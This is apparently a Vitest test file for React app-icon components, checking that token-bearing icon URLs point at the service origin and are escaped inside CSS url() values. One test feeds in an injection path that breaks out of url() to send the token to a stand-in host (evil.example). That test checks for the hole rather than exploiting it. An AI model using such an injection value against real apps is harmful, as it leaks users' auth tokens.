// An app icon's token-bearing URL goes to the service, never to the page's own origin.

import { describe, it, expect, vi } from 'vitest';
import { render } from '@testing-library/react';

vi.mock('../../api/auth', () => ({ getTokenSync: () => 'tok' }));

describe('appIconComponent', () => {
  it('points the token-bearing src at the service, not the page origin', async () => {
    const { appIconComponent } = await import('./AppIconImage');
    const { resolveHttp } = await import('../../api/service');
    const Icon = appIconComponent('/apps-api/installed/com.x.app/asset/assets/icon.svg');
    const { container } = render(<Icon size={14} />);
    expect(container.querySelector('img')!.getAttribute('src'))
      .toBe(`${resolveHttp('/apps-api/installed/com.x.app/asset/assets/icon.svg')}?token=tok`);
    expect(resolveHttp('/x')).toMatch(/^https?:\/\//);
  });
});

describe('appIconMaskComponent', () => {
  it('draws the token-bearing mark as a mask, not an image', async () => {
    const { appIconMaskComponent } = await import('./AppIconImage');
    const { resolveHttp } = await import('../../api/service');
    const src = '/apps-api/installed/com.x.app/asset/assets/icon.svg';
    const Icon = appIconMaskComponent(src);
    const { container } = render(<Icon size={18} />);
    expect(container.querySelector('img')).toBeNull();
    const el = container.querySelector('span') as HTMLElement;
    expect(el.style.getPropertyValue('--icon-url')).toBe(`url("${resolveHttp(src)}?token=tok")`);
    expect(el.style.width).toBe('18px');
  });

  // The icon path is app-authored: a quote in it must not end the url() string
  // and append a second mask layer the token would be sent to.
  it('keeps a manifest-controlled path inside one url()', async () => {
    const { appIconMaskComponent } = await import('./AppIconImage');
    const Icon = appIconMaskComponent('/apps-api/installed/com.x.app/asset/a.svg"), url("https://evil.example/x?');
    const { container } = render(<Icon size={18} />);
    const value = (container.querySelector('span') as HTMLElement).style.getPropertyValue('--icon-url');
    expect(value.startsWith('url("')).toBe(true);
    expect(value.endsWith('")')).toBe(true);
    expect(value.slice(5, -2)).not.toMatch(/["'()\\\s]/);
    expect(value).toContain('a.svg%22%29');
  });
});
